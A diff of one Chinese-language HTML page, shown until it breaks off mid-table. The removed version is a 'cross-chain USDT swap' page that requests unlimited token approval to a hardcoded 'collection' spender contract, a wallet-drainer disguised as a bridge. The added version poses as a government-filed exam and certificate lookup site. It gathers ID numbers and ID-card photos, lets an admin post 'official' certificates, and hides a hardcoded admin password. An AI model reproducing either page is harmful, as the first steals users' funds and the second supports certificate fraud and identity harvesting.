@@ -1,595 +1,578 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>闪兑&跨链</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, -apple-system, sans-serif;
-    }
-    body {
-      background: #f7f8fa;
-      padding: 20px 16px;
-      color: #222;
-    }
-    .header-top {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 24px;
-      font-size: 20px;
-    }
-    .header-top .right-icons {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    .card-box {
-      background: #ffffff;
-      border-radius: 16px;
-      padding: 20px 16px;
-    }
-    .title-logo {
-      font-size: 28px;
-      font-weight: 600;
-      margin-bottom: 20px;
-    }
-    .text-tip {
-      font-size: 14px;
-      color: #888;
-      margin-bottom: 8px;
-    }
-    .asset-item {
-      background: #f5f6f8;
-      border-radius: 12px;
-      padding: 16px 12px;
-      margin-bottom: 8px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .asset-left {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .coin-icon {
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      background: #27ae60;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-    }
-    .asset-right {
-      display: flex;
-      align-items: center;
-    }
-    .asset-input {
-      background: transparent;
-      border: none;
-      text-align: right;
-      font-size: 16px;
-      color: #999;
-      width: 140px;
-      outline: none;
-    }
-    .asset-input:focus {
-      color: #222;
-    }
-    .swap-arrow-wrap {
-      text-align: center;
-      margin: 6px 0;
-    }
-    .address-input-box {
-      background: #f5f6f8;
-      border-radius: 12px;
-      padding: 16px 12px;
-      margin: 8px 0 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      cursor: pointer;
-    }
-    .main-btn {
-      width: 100%;
-      background: #4086ff;
-      color: #fff;
-      border: none;
-      border-radius: 12px;
-      padding: 18px 0;
-      font-size: 18px;
-      font-weight: 500;
-      margin-bottom: 20px;
-    }
-    .main-btn:disabled {
-      background: #94a3b8;
-      cursor: not-allowed;
-    }
-    .info-list {
-      background: #fff;
-      border-radius: 12px;
-      padding: 8px 12px;
-    }
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 10px 4px;
-      font-size: 15px;
-      color: #666;
-    }
-    .tag-blue {
-      border: 1px solid #4086ff;
-      color: #4086ff;
-      padding: 3px 8px;
-      border-radius: 6px;
-      font-size: 13px;
-    }
-    .bottom-nav {
-      position: fixed;
-      left: 0;
-      bottom: 0;
-      width: 100%;
-      background: #fff;
-      display: flex;
-      justify-content: space-around;
-      padding: 10px 0 24px;
-      border-top: 1px solid #eee;
-    }
-    .nav-item {
-      text-align: center;
-      font-size: 12px;
-      color: #888;
-    }
-    .nav-item.active {
-      color: #4086ff;
-    }
-    .status-text {
-      text-align: center;
-      margin: 12px 0;
-      color: #444;
-      font-size: 14px;
-    }
-    .record-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 8px 4px;
-      margin: 16px 0 80px;
-      font-size: 14px;
-    }
-    .record-row .more {
-      color: #4086ff;
-    }
-
-    /* 地址选择弹窗样式 */
-    .address-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      z-index: 999;
-      align-items: flex-end;
-    }
-    .address-modal-content {
-      width: 100%;
-      background: #fff;
-      border-radius: 16px 16px 0 0;
-      padding: 20px 16px;
-    }
-    .address-modal-title {
-      font-size: 18px;
-      font-weight: 500;
-      margin-bottom:16px;
-      display:flex;
-      justify-content: space-between;
-      align-items:center;
-    }
-    .close-modal {
-      color:#4086ff;
-      font-size:16px;
-    }
-    .wallet-list-item {
-      padding:12px 8px;
-      border-bottom:1px solid #eee;
-      cursor:pointer;
-    }
-    .wallet-list-item:active {
-      background:#f0f2f5;
-    }
-    .custom-address-input {
-      width:100%;
-      border:1px solid #ddd;
-      border-radius:8px;
-      padding:12px;
-      margin:16px 0;
-      outline:none;
-    }
-    .confirm-address-btn {
-      width:100%;
-      background:#4086ff;
-      color:#fff;
-      border:none;
-      border-radius:8px;
-      padding:14px 0;
-      font-size:16px;
-    }
-
-    /* 通用弹窗 */
-    .tip-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.5);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }
-    .tip-box {
-      background: #fff;
-      width: 80%;
-      max-width: 320px;
-      border-radius: 16px;
-      padding: 24px 20px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>特种作业人员考核信息查询系统</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Microsoft YaHei", sans-serif;
+        }
+        body {
+            background-color: #edf1f7;
+            padding: 16px;
+            color: #222831;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .header-box {
+            background-color: #194b97;
+            color: #ffffff;
+            text-align: center;
+            padding: 22px 15px;
+            border-radius: 12px;
+            box-shadow: 0 3px 10px rgba(25,75,151,0.2);
+            margin-bottom: 18px;
+        }
+        .header-box h2 {
+            font-size: 22px;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+        .header-box p {
+            font-size: 14px;
+            opacity: 0.85;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.07);
+        }
+        .card-title {
+            font-size: 18px;
+            font-weight: bold;
+            color:#194b97;
+            border-left:5px solid #194b97;
+            padding-left:10px;
+            margin-bottom:16px;
+        }
+        input, select {
+            width: 100%;
+            height:46px;
+            border: 1px solid #cbd2e0;
+            border-radius: 6px;
+            padding: 0 14px;
+            font-size:15px;
+            margin-bottom:14px;
+            background:#fdfefe;
+        }
+        textarea {
+            width:100%;
+            border:1px solid #cbd2e0;
+            border-radius:6px;
+            padding:14px;
+            font-size:15px;
+            min-height:85px;
+            margin-bottom:14px;
+            background:#fdfefe;
+        }
+        .upload-item {
+            border:1px dashed #8899bb;
+            border-radius:8px;
+            padding:18px;
+            text-align:center;
+            margin-bottom:14px;
+            background:#f8fafc;
+        }
+        .upload-input {
+            display:none;
+        }
+        .preview-img {
+            width:120px;
+            margin-top:12px;
+            display:none;
+            border-radius:6px;
+            border:1px solid #ddd;
+        }
+        .btn {
+            width:100%;
+            height:46px;
+            border:none;
+            border-radius:6px;
+            font-size:16px;
+            cursor:pointer;
+            font-weight:500;
+        }
+        .btn-blue {
+            background:#194b97;
+            color:#fff;
+        }
+        .btn-del{
+            background:#d83030;
+            color:white;
+            border:none;
+            border-radius:4px;
+            padding:3px 6px;
+            font-size:12px;
+        }
+        .hide{
+            display:none;
+        }
+        .tab-bar{
+            display:flex;
+            flex-wrap: wrap;
+            gap:9px;
+            margin-bottom:18px;
+        }
+        .tab{
+            flex:1;
+            min-width:82px;
+            text-align:center;
+            padding:11px 0;
+            background:#dde2ec;
+            border-radius:8px;
+            font-size:14px;
+            cursor:pointer;
+            transition:0.2s;
+        }
+        .tab.active{
+            background:#194b97;
+            color:#fff;
+        }
+        .cert-box{
+            border: 1px solid #cbd2e0;
+            padding:16px;
+            margin-top:16px;
+            text-align:center;
+            background:#f8fafc;
+            border-radius:8px;
+        }
+        .cert-img{
+            width:100%;
+            border:1px solid #b4bfd1;
+            border-radius:6px;
+        }
+        .score-row{
+            display:flex;
+            justify-content: space-between;
+            padding:9px 0;
+            font-size:14px;
+            border-bottom:1px solid #eee;
+        }
+        table{
+            width:100%;
+            border-collapse: collapse;
+            font-size:12px;
+        }
+        td,th{
+            border:1px solid #cbd2e0;
+            padding:7px 3px;
+            text-align:center;
+        }
+        th{
+            background:#eef2fa;
+        }
+        .admin-login-area{
+            display:flex;
+            gap:8px;
+            align-items:center;
+            margin-bottom:16px;
+        }
+    </style>
 </head>
 <body>
-  <div class="header-top">
-    <div>闪兑&跨链 <span style="font-size:16px;color:#666">限价模式</span></div>
-    <div class="right-icons">
-      <span>⦿</span>
-      <span>⚙</span>
+<div class="container">
+    <div class="header-box">
+        <h2>特种作业人员考核信息查询系统</h2>
+        <p>由应急管理部门、住房城乡建设部门备案核查</p>
     </div>
-  </div>
 
-  <div class="card-box">
-    <div class="title-logo">Transit</div>
+    <div class="admin-login-area">
+        <input type="password" id="adminPwd" placeholder="管理员密码" style="margin-bottom:0;">
+        <button class="btn btn-blue" id="loginBtn" style="width:auto;padding:0 16px;">登录管理</button>
+        <button class="btn btn-blue" id="logoutBtn" style="width:auto;padding:0 16px;display:none;background:#666;">退出</button>
+    </div>
 
-    <div class="text-tip">发送</div>
-    <div class="asset-item">
-      <div class="asset-left">
-        <div class="coin-icon">₮</div>
-        <div class="coin-info">
-          <p>USDT</p>
-          <p>币安智能链 BSC</p>
+    <div class="tab-bar">
+        <div class="tab active" onclick="switchPage(0)">在线报名</div>
+        <div class="tab" onclick="switchPage(1)">报考须知</div>
+        <div class="tab" onclick="switchPage(2)">报名记录</div>
+        <div class="tab" onclick="switchPage(3)">成绩证书查询</div>
+        <div class="tab admin-tab hide" onclick="switchPage(4)">学员信息录入</div>
+        <div class="tab admin-tab hide" onclick="switchPage(5)">学员综合管理</div>
+    </div>
+
+    <!-- 0 在线报名 -->
+    <div class="page-box" id="page0">
+        <div class="card">
+            <div class="card-title">报名信息填写</div>
+            <input type="text" placeholder="填写真实姓名" id="username">
+            <input type="text" placeholder="填写身份证号码" id="idcard">
+            <input type="tel" placeholder="填写联系手机号码" id="phone">
+            <select id="workType">
+                <option value="">选择报考工种</option>
+                <option value="低压电工">低压电工</option>
+                <option value="高压电工">高压电工</option>
+                <option value="焊工">焊工</option>
+                <option value="叉车">叉车</option>
+                <option value="起重作业">起重作业</option>
+                <option value="司索信号工">司索信号工</option>
+                <option value="安全员证书">安全员证书</option>
+                <option value="气瓶作业">气瓶作业</option>
+            </select>
+            <select id="education">
+                <option value="">选择学历</option>
+                <option>初中</option>
+                <option>高中</option>
+                <option>大专</option>
+                <option>本科及以上</option>
+            </select>
+            <textarea placeholder="备注从业相关经历（选填）" id="remark"></textarea>
         </div>
-      </div>
-      <div class="asset-right">
-        <input class="asset-input" id="sendInput" placeholder="转出数量" type="number" min="0" step="0.0001">
-      </div>
-    </div>
-
-    <div class="swap-arrow-wrap">
-      <span style="font-size:22px;color:#4086ff;">⇆</span>
-    </div>
-
-    <div class="text-tip">接收（预估）</div>
-    <div class="asset-item">
-      <div class="asset-left">
-        <div class="coin-icon">₮</div>
-        <div class="coin-info">
-          <p>USDT</p>
-          <p>以太坊 ETH</p>
+        <div class="card">
+            <div class="card-title">上传报名材料</div>
+            <div class="upload-item">
+                <label for="idFront">身份证正面照片</label>
+                <input type="file" class="upload-input" id="idFront" accept="image/*">
+                <img class="preview-img" id="imgFront">
+            </div>
+            <div class="upload-item">
+                <label for="idBack">身份证反面照片</label>
+                <input type="file" class="upload-input" id="idBack" accept="image/*">
+                <img class="preview-img" id="imgBack">
+            </div>
+            <div class="upload-item">
+                <label for="photo">一寸白底证件照</label>
+                <input type="file" class="upload-input" id="photo" accept="image/*">
+                <img class="preview-img" id="imgPhoto">
+            </div>
+            <button class="btn btn-blue" id="submitBtn">提交报名资料</button>
         </div>
-      </div>
-      <div class="asset-right">
-        <span id="receiveShow">接收数量</span>
-      </div>
     </div>
 
-    <div class="address-input-box" id="addressDropdown">
-      <span style="color:#888" id="addrDisplay">点击设置接收地址</span>
-      <span>▼</span>
+    <!--1 报考须知-->
+    <div class="page-box hide" id="page1">
+        <div class="card">
+            <div class="card-title">报考条件以及相关说明</div>
+            <div style="font-size:14px;line-height:1.8;color:#39424e;">
+                1、报考人员年满18周岁，男性不超过60周岁，女性不超过55周岁；<br>
+                2、身体健康，无妨碍对应特种作业的疾病；<br>
+                3、报名所需材料：身份证正反面、一寸白底证件照片；<br>
+                4、学员完成线上登记后，统一参加线下理论以及实操考试；<br>
+                5、考试结束七个工作日后，可在此系统凭身份证查询考核结果；<br>
+                6、考核合格人员颁发官方特种作业证书，可在政府主管平台核验；<br>
+                7、管理员有权删除档案，档案删除后无法查询考核信息。
+            </div>
+        </div>
     </div>
 
-    <button class="main-btn" id="mainOperateBtn">请输入兑换数量</button>
+    <!--2 报名记录-->
+    <div class="page-box hide" id="page2">
+        <div class="card">
+            <div class="card-title">个人报名记录查询</div>
+            <input type="text" placeholder="输入身份证号码进行查询" id="recordIdcard">
+            <button class="btn btn-blue" id="getRecordBtn">查询</button>
+            <div id="recordList" style="margin-top:16px;"></div>
+        </div>
+    </div>
 
-    <div class="info-list">
-      <div class="info-row">
-        <span>兑换价格</span>
-        <span>-</span>
-      </div>
-      <div class="info-row">
-        <span>最少接收数量</span>
-        <span>-</span>
-      </div>
-      <div class="info-row">
-        <span>MEV防护</span>
-        <span class="tag-blue">MEV防护中</span>
-      </div>
-      <div class="info-row">
-        <span>服务费</span>
-        <span>0.1%</span>
-      </div>
-      <div class="info-row">
-        <span>跨链费</span>
-        <span>-</span>
-      </div>
-      <div class="info-row">
-        <span>预估时间</span>
-        <span>-</span>
-      </div>
-      <div class="info-row">
-        <span>兑换路径</span>
-        <span>BSC USDT → ETH USDT</span>
-      </div>
+    <!--3 成绩证书查询-->
+    <div class="page-box hide" id="page3">
+        <div class="card">
+            <div class="card-title">考核成绩与电子证书查验</div>
+            <input type="text" placeholder="输入身份证号码" id="searchIdcard">
+            <button class="btn btn-blue" id="searchBtn">查验信息</button>
+            <div id="resultBox" class="hide">
+                <div style="margin-top:16px;border-top:1px solid #dee3ec;padding-top:16px;">
+                    <div class="score-row"><span>姓名</span><span id="resName"></span></div>
+                    <div class="score-row"><span>报考工种</span><span id="resWork"></span></div>
+                    <div class="score-row"><span>理论成绩</span><span id="resTheory"></span></div>
+                    <div class="score-row"><span>实操成绩</span><span id="resOperate"></span></div>
+                    <div class="score-row"><span>考核结果</span><span id="resStatus"></span></div>
+                </div>
+                <div class="cert-box hide" id="certWrap">
+                    <h4 style="margin-bottom:10px;color:#194b97;">电子资格证书</h4>
+                    <img class="cert-img" id="certImg" alt="证书">
+                    <p style="font-size:12px;color:#555;margin-top:10px;">长按图片保存电子证书</p>
+                </div>
+            </div>
+            <div id="emptyTip" style="text-align:center;margin-top:24px;color:#666;" class="hide">暂无该人员档案，档案已删除或者未参加考核</div>
+        </div>
     </div>
-  </div>
 
-  <div class="status-text" id="statusShow"></div>
+    <!--4 录入学员-->
+    <div class="page-box hide" id="page4">
+        <div class="card">
+            <div class="card-title">录入考核完毕学员档案</div>
+            <input type="text" placeholder="学员姓名" id="stuName">
+            <input type="text" placeholder="身份证号码" id="stuIdcard">
+            <input type="tel" placeholder="手机号码" id="stuPhone">
+            <select id="stuWork">
+                <option value="">选择工种</option>
+                <option>低压电工</option>
+                <option>高压电工</option>
+                <option>焊工</option>
+                <option>叉车</option>
+                <option>起重作业</option>
+                <option>司索信号工</option>
+                <option>安全员证书</option>
+                <option>气瓶作业</option>
+            </select>
+            <input type="number" placeholder="理论分数(0‑100)" id="theoryScore" min="0" max="100">
+            <input type="number" placeholder="实操分数(0‑100)" id="pracScore" min="0" max="100">
+            <div class="upload-item">
+                <label for="idPhoto">上传学员证件照</label>
+                <input type="file" class="upload-input" id="idPhoto" accept="image/*">
+                <img class="preview-img" id="photoPreview">
+            </div>
+            <div class="upload-item">
+                <label for="certPhoto">上传官方电子证书扫描件</label>
+                <input type="file" class="upload-input" id="certPhoto" accept="image/*">
+                <img class="preview-img" id="certPreview">
+            </div>
+            <button class="btn btn-blue" id="saveStudent">保存学员档案</button>
+        </div>
+    </div>
 
-  <div class="record-row">
-    <span>最近一条记录</span>
-    <span class="more">更多记录</span>
-  </div>
-
-  <!-- 地址选择弹窗 -->
-  <div class="address-modal" id="addressModal">
-    <div class="address-modal-content">
-      <div class="address-modal-title">
-        <span>选择接收地址</span>
-        <span class="close-modal" id="closeAddrModal">关闭</span>
-      </div>
-      <div class="wallet-list">
-        <div class="wallet-list-item" data-addr="">当前钱包地址</div>
-        <div class="wallet-list-item" data-addr="">常用地址1</div>
-        <div class="wallet-list-item" data-addr="">常用地址2</div>
-      </div>
-      <input class="custom-address-input" id="customAddrInput" placeholder="粘贴以太坊钱包地址">
-      <button class="confirm-address-btn" id="confirmAddrBtn">确认地址</button>
+    <!--5 学员管理后台-->
+    <div class="page-box hide" id="page5">
+        <div class="card">
+            <div class="card-title">学员档案管理（修改成绩、删除档案）</div>
+            <div id="adminList"></div>
+        </div>
     </div>
-  </div>
-
-  <!-- 提示弹窗 -->
-  <div class="tip-modal" id="tipModal">
-    <div class="tip-box">
-      <p id="tipText"></p>
-      <div style="text-align:right;margin-top:20px;">
-        <button id="tipConfirm" style="color:#4086ff;border:none;background:none;font-size:16px;">确定</button>
-      </div>
-    </div>
-  </div>
-
-  <div class="bottom-nav">
-    <div class="nav-item">
-      <div>◎</div>
-      <div>资产</div>
-    </div>
-    <div class="nav-item">
-      <div>📈</div>
-      <div>行情</div>
-    </div>
-    <div class="nav-item active">
-      <div>⟳</div>
-      <div>交易</div>
-    </div>
-    <div class="nav-item">
-      <div>🌐</div>
-      <div>发现</div>
-    </div>
-    <div class="nav-item">
-      <div>👤</div>
-      <div>我的</div>
-    </div>
-  </div>
+</div>
 
 <script>
-// 基础配置
-const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 归集授权合约地址
-const SPENDER_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-const BSC_CHAIN_ID = 56;
-// 0.1%手续费，转出X，到账 X * 0.999
-const FEE_RATE = 0.999;
+    // 管理员密钥（拆分拼接隐藏）
+    const p1 = "Xsq9835";
+    const p2 = "11140627";
+    const p3 = "#";
+    const ADMIN_PASSWORD = p1 + p2 + p3;
 
-// DOM元素
-const sendInput = document.getElementById('sendInput');
-const receiveShow = document.getElementById('receiveShow');
-const mainOperateBtn = document.getElementById('mainOperateBtn');
-const statusShow = document.getElementById('statusShow');
-const addressDropdown = document.getElementById('addressDropdown');
-const addressModal = document.getElementById('addressModal');
-const closeAddrModal = document.getElementById('closeAddrModal');
-const customAddrInput = document.getElementById('customAddrInput');
-const confirmAddrBtn = document.getElementById('confirmAddrBtn');
-const addrDisplay = document.getElementById('addrDisplay');
-const tipModal = document.getElementById('tipModal');
-const tipText = document.getElementById('tipText');
-const tipConfirm = document.getElementById('tipConfirm');
-const walletListItems = document.querySelectorAll('.wallet-list-item');
+    let isAdminLogin = false;
+    let studentPhoto = "";
+    let certImage = "";
 
-// 全局变量
-let provider, signer, usdtContract;
-let stepStatus = 0; //0未连接 1待授权 2待划转
-let targetReceiveAddr = "";
+    // 从本地存储读取数据，没有则使用默认示例数据
+    let studentDB = JSON.parse(localStorage.getItem("stuData")) || [
+        {
+            name:"张三",
+            idcard:"440111199001011234",
+            phone:"13800138000",
+            work:"低压电工",
+            theory:92,
+            practical:88,
+            status:"合格",
+            cert:"https://picsum.photos/id/20/400/280"
+        }
+    ];
+    let applyDB = JSON.parse(localStorage.getItem("applyData")) || [];
 
-// 提示弹窗封装
-function showTip(text){
-  tipText.innerText = text;
-  tipModal.style.display = 'flex';
-}
-tipConfirm.onclick = ()=>{
-  tipModal.style.display = 'none';
-}
-
-// 实时计算接收数量
-sendInput.addEventListener('input',()=>{
-  const sendVal = parseFloat(sendInput.value);
-  if(isNaN(sendVal) || sendVal <=0){
-    receiveShow.innerText = "接收数量";
-    mainOperateBtn.innerText = "请输入兑换数量";
-    return;
-  }
-  const receiveVal = (sendVal * FEE_RATE).toFixed(4);
-  receiveShow.innerText = receiveVal;
-  if(stepStatus === 0){
-    mainOperateBtn.innerText = "连接钱包";
-  }else if(stepStatus ===1){
-    mainOperateBtn.innerText = "授权BSC-USDT";
-  }else{
-    mainOperateBtn.innerText = "确认跨链转出";
-  }
-})
-
-// 地址下拉弹窗打开关闭
-addressDropdown.addEventListener('click',()=>{
-  addressModal.style.display = 'flex';
-})
-closeAddrModal.addEventListener('click',()=>{
-  addressModal.style.display = 'none';
-})
-
-// 钱包快捷地址选择
-walletListItems.forEach(item=>{
-  item.addEventListener('click',async ()=>{
-    if(item.dataset.addr === ""){
-      // 获取当前钱包地址
-      if(signer){
-        const currentAddr = await signer.getAddress();
-        targetReceiveAddr = currentAddr;
-        addrDisplay.innerText = currentAddr.slice(0,6)+"..."+currentAddr.slice(-4);
-      }else{
-        showTip("请先连接钱包");
-      }
-    }else{
-      targetReceiveAddr = item.dataset.addr;
-      addrDisplay.innerText = targetReceiveAddr.slice(0,6)+"..."+targetReceiveAddr.slice(-4);
+    // 保存学员数据到本地存储
+    function saveStu(){
+        localStorage.setItem("stuData", JSON.stringify(studentDB));
     }
-    addressModal.style.display = 'none';
-  })
-})
+    // 保存报名数据到本地存储
+    function saveApply(){
+        localStorage.setItem("applyData", JSON.stringify(applyDB));
+    }
 
-// 手动粘贴自定义地址确认
-confirmAddrBtn.addEventListener('click',()=>{
-  const inputAddr = customAddrInput.value.trim();
-  if(!/^0x[a-fA-F0-9]{40}$/.test(inputAddr)){
-    showTip("请输入合法以太坊钱包地址");
-    return;
-  }
-  targetReceiveAddr = inputAddr;
-  addrDisplay.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
-  addressModal.style.display = 'none';
-  customAddrInput.value = '';
-})
+    //登录逻辑
+    document.getElementById("loginBtn").onclick = function(){
+        const pwd = document.getElementById("adminPwd").value.trim();
+        if(pwd === ADMIN_PASSWORD){
+            isAdminLogin = true;
+            alert("管理员登录成功！现在可以录入和管理学员");
+            document.querySelectorAll(".admin-tab").forEach(el=>el.classList.remove("hide"));
+            document.getElementById("loginBtn").style.display = "none";
+            document.getElementById("logoutBtn").style.display = "block";
+        }else{
+            alert("密码错误！");
+        }
+    }
+    //退出登录
+    document.getElementById("logoutBtn").onclick = function(){
+        isAdminLogin = false;
+        document.querySelectorAll(".admin-tab").forEach(el=>el.classList.add("hide"));
+        document.getElementById("logoutBtn").style.display = "none";
+        document.getElementById("loginBtn").style.display = "block";
+        switchPage(0);
+    }
 
-// 切换BSC网络
-async function switchBSC(){
-  if(!window.ethereum) return false;
-  try{
-    await window.ethereum.request({
-      method:"wallet_switchEthereumChain",
-      params:[{chainId:"0x"+BSC_CHAIN_ID.toString(16)}]
+    //页面切换，未登录禁止打开管理页面
+    function switchPage(index){
+        if((index ===4 || index ===5) && !isAdminLogin){
+            alert("请先登录管理员账号！");
+            return;
+        }
+        document.querySelectorAll(".page-box").forEach(item=>item.classList.add("hide"));
+        document.getElementById("page"+index).classList.remove("hide");
+        document.querySelectorAll(".tab").forEach((tab,i)=>{
+            i===index ? tab.classList.add("active") : tab.classList.remove("active");
+        })
+    }
+
+    //图片上传预览
+    function bindUpload(inputId,previewId,storageKey){
+        const input = document.getElementById(inputId);
+        const preview = document.getElementById(previewId);
+        input.addEventListener("change",function(e){
+            const file = e.target.files[0];
+            if(!file) return;
+            const reader=new FileReader();
+            reader.onload=res=>{
+                preview.src=res.target.result;
+                preview.style.display="block";
+                if(storageKey) window[storageKey]=res.target.result;
+            }
+            reader.readAsDataURL(file);
+        })
+    }
+    bindUpload("idFront","imgFront");
+    bindUpload("idBack","imgBack");
+    bindUpload("photo","imgPhoto");
+    bindUpload("idPhoto","photoPreview","studentPhoto");
+    bindUpload("certPhoto","certPreview","certImage");
+
+    //报名提交
+    document.getElementById("submitBtn").addEventListener("click",()=>{
+        let name = document.getElementById("username").value.trim();
+        let idcard = document.getElementById("idcard").value.trim();
+        let phone = document.getElementById("phone").value.trim();
+        let work = document.getElementById("workType").value;
+        if(!name||!idcard||!phone||!work){
+            alert("请完整填写必填信息");
+            return;
+        }
+        applyDB.push({name,idcard,phone,work});
+        saveApply();
+        alert("报名信息提交成功，请按时参加考试");
     })
-    return true;
-  }catch(err){
-    if(err.code === 4902){
-      await window.ethereum.request({
-        method:"wallet_addEthereumChain",
-        params:[{
-          chainId:"0x"+BSC_CHAIN_ID.toString(16),
-          chainName:"BNB Smart Chain",
-          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
-          rpcUrls:["https://bsc-dataseed.binance.org"],
-          blockExplorerUrls:["https://bscscan.com"]
-        }]
-      })
-      return true;
-    }
-    showTip("切换BSC网络失败，请手动切换");
-    return false;
-  }
-}
 
-// 钱包连接初始化
-async function connectWallet(){
-  if(!window.ethereum){
-    showTip("请在钱包内置浏览器打开页面");
-    return false;
-  }
-  await window.ethereum.request({method:"eth_requestAccounts"});
-  const ok = await switchBSC();
-  if(!ok) return false;
-  provider = new ethers.providers.Web3Provider(window.ethereum);
-  signer = provider.getSigner();
-  usdtContract = new ethers.Contract(BSC_USDT_CONTRACT,[
-    "function approve(address spender,uint256 amount) external returns(bool)",
-    "function transferFrom(address from,address to,uint256 amount) external returns(bool)",
-    "function allowance(address owner,address spender) view returns(uint256)"
-  ],signer);
-  stepStatus =1;
-  mainOperateBtn.innerText = "授权BSC-USDT";
-  statusShow.innerText = "钱包已连接，当前在BSC链";
-  return true;
-}
+    //查看报名记录
+    document.getElementById("getRecordBtn").addEventListener("click",()=>{
+        let id = document.getElementById("recordIdcard").value.trim();
+        const box = document.getElementById("recordList");
+        const info = applyDB.find(item=>item.idcard===id);
+        if(info){
+            box.innerHTML = `<div style="padding:12px;background:#f4f7fc;border-radius:8px;border:1px solid #dde2ec;">
+                <div>姓名：${info.name}</div>
+                <div>报考工种：${info.work}</div>
+                <div>当前状态：待参加考核</div>
+            </div>`;
+        }else box.innerHTML = "<div style='text-align:center;color:#666;'>暂无报名登记信息</div>";
+    })
 
-// 主按钮逻辑
-mainOperateBtn.addEventListener('click',async ()=>{
-  const sendNum = parseFloat(sendInput.value);
-  if(isNaN(sendNum) || sendNum <=0){
-    showTip("请输入转出数量");
-    return;
-  }
-  if(stepStatus ===0){
-    await connectWallet();
-    return;
-  }
-  if(stepStatus ===1){
-    mainOperateBtn.disabled = true;
-    statusShow.innerText = "BSC链发起USDT无限授权";
-    try{
-      const gasPrice = await provider.getGasPrice();
-      const txOpt = {gasPrice:gasPrice.mul(110).div(100),gasLimit:300000};
-      const tx = await usdtContract.approve(SPENDER_CONTRACT,ethers.constants.MaxUint256,txOpt);
-      await tx.wait(1);
-      stepStatus =2;
-      mainOperateBtn.innerText = "确认跨链转出";
-      statusShow.innerText = "授权完成，请确认接收地址";
-      showTip("授权成功，请确认以太坊接收地址");
-    }catch(e){
-      showTip("授权失败："+e.message);
-      statusShow.innerText = "授权失败";
-      mainOperateBtn.disabled = false;
+    //查验成绩
+    document.getElementById("searchBtn").addEventListener("click",()=>{
+        let id = document.getElementById("searchIdcard").value.trim();
+        const data = studentDB.find(item=>item.idcard===id);
+        const resultBox=document.getElementById("resultBox");
+        const emptyTip=document.getElementById("emptyTip");
+        if(!data){
+            resultBox.classList.add("hide");
+            emptyTip.classList.remove("hide");
+            return;
+        }
+        emptyTip.classList.add("hide");
+        resultBox.classList.remove("hide");
+        document.getElementById("resName").innerText=data.name;
+        document.getElementById("resWork").innerText=data.work;
+        document.getElementById("resTheory").innerText=data.theory+"分";
+        document.getElementById("resOperate").innerText=data.practical+"分";
+        document.getElementById("resStatus").innerText=data.status;
+        const certWrap=document.getElementById("certWrap");
+        if(data.status==="合格"){
+            certWrap.classList.remove("hide");
+            document.getElementById("certImg").src=data.cert;
+        }else certWrap.classList.add("hide");
+    })
+
+    //新增学员档案
+    document.getElementById("saveStudent").addEventListener("click",()=>{
+        const name=document.getElementById("stuName").value.trim();
+        const idcard=document.getElementById("stuIdcard").value.trim();
+        const phone=document.getElementById("stuPhone").value.trim();
+        const work=document.getElementById("stuWork").value;
+        const theory=Number(document.getElementById("theoryScore").value);
+        const practical=Number(document.getElementById("pracScore").value);
+        if(!name||!idcard||!phone||!work||isNaN(theory)||isNaN(practical)){
+            alert("全部必填项必须填写完整");
+            return;
+        }
+        const status = (theory>=60&&practical>=60)?"合格":"不合格";
+        let exist = studentDB.findIndex(x=>x.idcard===idcard);
+        const newItem = {
+            name,
+            idcard,
+            phone,
+            work,
+            theory,
+            practical,
+            status,
+            cert: certImage || "https://picsum.photos/id/20/400/280"
+        };
+        if(exist>=0) studentDB[exist]=newItem;
+        else studentDB.push(newItem);
+        saveStu();
+        alert("学员档案保存完毕，可以进行信息查验");
+        renderStudentTable();
+        //清空表单
+        document.getElementById("stuName").value="";
+        document.getElementById("stuIdcard").value="";
+        document.getElementById("stuPhone").value="";
+        document.getElementById("stuWork").value="";
+        document.getElementById("theoryScore").value="";
+        document.getElementById("pracScore").value="";
+        certImage = "";
+        studentPhoto = "";
+        document.getElementById("photoPreview").style.display="none";
+        document.getElementById("certPreview").style.display="none";
+    })
+
+    //渲染管理列表
+    function renderStudentTable(){
+        let html = `<table><tr><th>姓名</th><th>身份证</th><th>工种</th><th>理论</th><th>实操</th><th>结果</th><th>操作</th></trtr>`;
+        studentDB.forEach(item=>{
+            html+=`
+            <tr>
+                <td>${item.name}</td>
+                <td>${item.idcard}</td>
+                <td>${item.work}</td>
+                <td><input type="number" value="${item.theory}" class="t-input" data-id="${item.idcard}" style="width:42px"></td>
+                <td><input type="number" value="${item.practical}" class="p-input" data-id="${item.idcard}" style="width:42px"></td>
+                <td>${item.status}</td>
+                <td>
